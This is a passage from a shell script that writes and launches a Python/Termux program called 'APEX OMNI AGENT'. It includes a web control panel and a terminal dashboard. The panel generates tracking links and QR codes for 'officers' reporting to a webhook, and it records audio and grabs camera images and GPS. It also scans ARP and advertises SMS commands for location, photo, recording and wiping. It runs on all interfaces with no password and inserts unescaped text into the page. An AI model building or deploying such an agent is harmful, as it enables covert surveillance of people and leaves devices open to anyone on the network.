    <input id="ofName" placeholder="Officer Name"/>
    <input id="cloudUrl" placeholder="Webhook/Cloud URL"/>
    <button class="btn" onclick="doDeploy()">Generate QR & Link</button>
    <div id="deployResult" style="margin-top:12px"></div>
    <br><button class="btn btn-danger" onclick="document.getElementById('deployModal').style.display='none'">Close</button>
  </div>
</div>

<script src="https://cdn.socket.io/4.5.0/socket.io.min.js"></script>
<script>
const socket = io();
let lastAIReply = '';

function switchTab(t){
  document.querySelectorAll('.tab').forEach(e=>e.classList.remove('active'));
  event.target.classList.add('active');
  document.querySelectorAll('.view').forEach(v=>v.classList.remove('active'));
  document.getElementById('view-'+t).classList.add('active');
}

// Health bar auto-update
async function updateHealth(){
  try{
    let r=await fetch('/api/health');let d=await r.json();
    document.getElementById('hCpu').innerText='CPU: '+d.cpu+'%';
    document.getElementById('hRam').innerText='RAM: '+d.ram+'%';
    document.getElementById('hAi').innerText='AI: '+d.ai;
    document.getElementById('statusLine').innerText='IP: '+d.ip+' | Port: 8080 | Password-free';
  }catch(e){}
}
updateHealth(); setInterval(updateHealth, 5000);

// Commando
function openDeploy(){document.getElementById('deployModal').style.display='flex';}
async function doDeploy(){
  let n=document.getElementById('ofName').value,c=document.getElementById('cloudUrl').value;
  if(!n||!c)return alert('Both fields required');
  let r=await fetch('/api/deploy?name='+encodeURIComponent(n)+'&cloud='+encodeURIComponent(c));
  let d=await r.json();
  document.getElementById('deployResult').innerHTML=
    '<p style="word-break:break-all"><a href="'+d.url+'" style="color:#00f0ff">'+d.url+'</a></p>'+
    '<img src="data:image/png;base64,'+d.qr+'" style="width:180px;margin-top:10px;border-radius:10px">';
}

async function runCmd(cmd){
  let out=document.getElementById('commandoOut');
  out.textContent='Running...';
  let r=await fetch('/api/'+cmd);let d=await r.json();
  out.textContent=d.output||d.error||'Done';
}

async function showOfficers(){
  let r=await fetch('/api/officers');let d=await r.json();
  let out='';d.forEach(o=>out+=o.name+' ('+o.ip+') - '+o.last+'\n');
  document.getElementById('commandoOut').textContent=out||'No officers';
}

async function showARP(){
  let r=await fetch('/api/arp');let d=await r.json();
  let out='';d.forEach(e=>out+=e.ts+' '+e.mac+' '+e.ip+'\n');
  document.getElementById('commandoOut').textContent=out||'No ARP data';
}

function showQR(){
  document.getElementById('commandoOut').innerHTML='<img src="/api/qr" style="width:200px;border-radius:12px">';
}

async function recordAudio(){
  document.getElementById('commandoOut').textContent='Recording 10s...';
  let r=await fetch('/api/record');
  let blob=await r.blob();
  document.getElementById('commandoOut').innerHTML='<audio controls src="'+URL.createObjectURL(blob)+'"></audio>';
}

// AI
async function askAI(){
  let p=document.getElementById('aiPrompt').value;if(!p)return;
  let box=document.getElementById('aiChatBox');
  box.innerHTML+='<div class="chat-msg chat-user">'+p+'</div>';
  box.innerHTML+='<div class="chat-msg chat-ai" id="aiLoading">Thinking...</div>';
  box.scrollTop=box.scrollHeight;
  document.getElementById('aiPrompt').value='';
  let r=await fetch('/api/ai',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({prompt:p})});
  let d=await r.json();
  lastAIReply=d.reply;
  document.getElementById('aiLoading').innerText=d.reply;
  document.getElementById('aiLoading').id='';
  box.scrollTop=box.scrollHeight;
}

async function voiceInput(){
  let box=document.getElementById('aiChatBox');
  box.innerHTML+='<div class="chat-msg chat-ai">Listening...</div>';
  let r=await fetch('/api/voice',{method:'POST'});
  let d=await r.json();
  if(d.text){document.getElementById('aiPrompt').value=d.text;askAI();}
}

function speakLast(){
  if(lastAIReply)fetch('/api/speak',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({text:lastAIReply})});
}

// Tools
async function installTool(n){
  document.getElementById('toolOut').textContent='Installing '+n+'...';
  let r=await fetch('/api/tools/install/'+n);let d=await r.json();
  document.getElementById('toolOut').textContent=d.output||d.error;
}

// Network
async function getCamera(){
  document.getElementById('netOut').innerHTML='<img src="/api/camera?t='+Date.now()+'" style="max-width:100%;border-radius:12px">';
}
async function getGPS(){
  let r=await fetch('/api/gps');let d=await r.json();
  document.getElementById('netOut').textContent=JSON.stringify(d,null,2);
}

// Logs
async function refreshLogs(){
  let r=await fetch('/api/logs');let d=await r.json();
  document.getElementById('logsOut').textContent=d.join('\n')||'No recent logs';
}
async function showAudit(){
  let r=await fetch('/api/audit');let d=await r.json();
  let out='';d.forEach(e=>out+=e.ts+' ['+e.event+'] '+e.data+' #'+e.hash+'\n');
  document.getElementById('logsOut').textContent=out||'No audit entries';
}

// Settings
async function saveConfig(){
  let num=document.getElementById('alertNumber').value;
  let lat=parseFloat(document.getElementById('geoLat').value);
  let lon=parseFloat(document.getElementById('geoLon').value);
  let rad=parseFloat(document.getElementById('geoRad').value)||100;
  let body={alert_number:num};
  if(!isNaN(lat)&&!isNaN(lon))body.geofence={lat:lat,lon:lon,radius:rad};
  await fetch('/api/config',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify(body)});
  alert('Config saved!');
}

// Socket events
socket.on('new_device',d=>{
  let out=document.getElementById('commandoOut');
  out.textContent+='\\n[NEW] '+d.ip+' '+d.mac;
});
</script>
</body>
</html>'''

# ======================== RICH TUI (Live Terminal Dashboard) ========================
def build_tui():
    layout = Layout()
    layout.split_column(
        Layout(name="header", size=3),
        Layout(name="body", ratio=1),
        Layout(name="footer", size=3),
    )

    # Header
    layout["header"].update(
        Panel(
            Text("APEX OMNI AGENT v22.0", style="bold cyan", justify="center"),
            border_style="cyan",
        )
    )

    # Body: top (stats + QR) and bottom (logs)
    body_layout = Layout()
    body_layout.split_column(
        Layout(name="top", ratio=1),
        Layout(name="bottom", ratio=1),
    )

    top_layout = Layout()
    top_layout.split_row(
        Layout(name="stats", ratio=2),
        Layout(name="qr", ratio=1),
    )

    # Stats panel
    cpu, ram = cpu_ram()
    stats_table = Table(expand=True, box=box.SIMPLE)
    stats_table.add_column("Item", style="cyan", width=14)
    stats_table.add_column("Value", style="white")
    stats_table.add_row("CPU", f"{cpu}%")
    stats_table.add_row("RAM", f"{ram}%")
    stats_table.add_row("AI", "Online" if OLLAMA_BIN.exists() else "Offline")
    stats_table.add_row("Web", f"http://{DIR_IP}:8080")
    stats_table.add_row("Password", "Not required")
    stats_table.add_row("Officers", str(get_officer_count()))
    top_layout["stats"].update(
        Panel(stats_table, title="[bold green]System[/]", border_style="green")
    )

    # QR in terminal
    url = f"http://{DIR_IP}:8080"
    qr_obj = qrcode.QRCode(version=1, box_size=1, border=1)
    qr_obj.add_data(url)
    qr_obj.make(fit=True)
    matrix = qr_obj.get_matrix()
    qr_lines = []
    for r in range(0, len(matrix) - 1, 2):
        line = ""
        for c_idx in range(len(matrix[0])):
            top_cell = matrix[r][c_idx]
            bot_cell = matrix[r + 1][c_idx] if r + 1 < len(matrix) else False
            if top_cell and bot_cell:
                line += "█"
            elif top_cell:
                line += "▀"
            elif bot_cell:
                line += "▄"
            else:
                line += " "
        qr_lines.append(line)
    qr_text = "\n".join(qr_lines)
    top_layout["qr"].update(
        Panel(
            Text(qr_text, style="white on black"),
            title="[bold cyan]Scan to Join[/]",
            border_style="cyan",
        )
    )

    body_layout["top"].update(top_layout)

    # Logs panel (bottom)
    log_items = []
    temp_items = []
    while not log_queue.empty():
        try:
            temp_items.append(log_queue.get_nowait())
        except queue.Empty:
            break
    for it in temp_items:
        try:
            log_queue.put_nowait(it)
        except queue.Full:
            break
    log_items = temp_items[-15:]
    logs_text = "\n".join(log_items) if log_items else "Waiting for events..."
    body_layout["bottom"].update(
        Panel(
            Text(logs_text, style="green"),
            title="[bold magenta]Live Activity[/]",
            border_style="magenta",
        )
    )

    layout["body"].update(body_layout)

    # Footer
    layout["footer"].update(
        Panel(
            Text(
                f"Web: http://{DIR_IP}:8080 | SMS: !!LOC !!PHOTO !!WIPE !!SCAN !!PING !!RECORD",
                style="yellow",
                justify="center",
            ),
            border_style="red",
        )
    )

    return layout

def get_officer_count():
    try:
        conn = sqlite3.connect(str(DB_PATH))
        c = conn.cursor()
        c.execute("SELECT COUNT(*) FROM officers")
        count = c.fetchone()[0]
        conn.close()
        return count
    except Exception:
        return 0

def tui_thread():
    time.sleep(2)
    try:
        with Live(build_tui(), refresh_per_second=2, screen=True) as live:
            while True:
                live.update(build_tui())
                time.sleep(1)
    except Exception as e:
        print(f"\n[TUI] Stopped: {e}. Flask server continues at http://{DIR_IP}:8080")

# ======================== MAIN ========================
if __name__ == "__main__":
    run_cmd(["termux-wake-lock"])

    print(f"\033[1;36m")
    print(f"  ╔═══════════════════════════════════════════╗")
    print(f"  ║     APEX OMNI AGENT v22.0 STARTED        ║")
    print(f"  ║     Web: http://{DIR_IP}:8080              ")
    print(f"  ║     Password: NOT REQUIRED                ║")
    print(f"  ║     QR: Scan from terminal or /api/qr     ║")
    print(f"  ╚═══════════════════════════════════════════╝")
    print(f"\033[0m")

    # Start TUI in background
    threading.Thread(target=tui_thread, daemon=True).start()

    # Start Flask
    socketio.run(app, host="0.0.0.0", port=8080, debug=False, use_reloader=False)
PYEOF

python ~/apex_omni/omni_agent.py
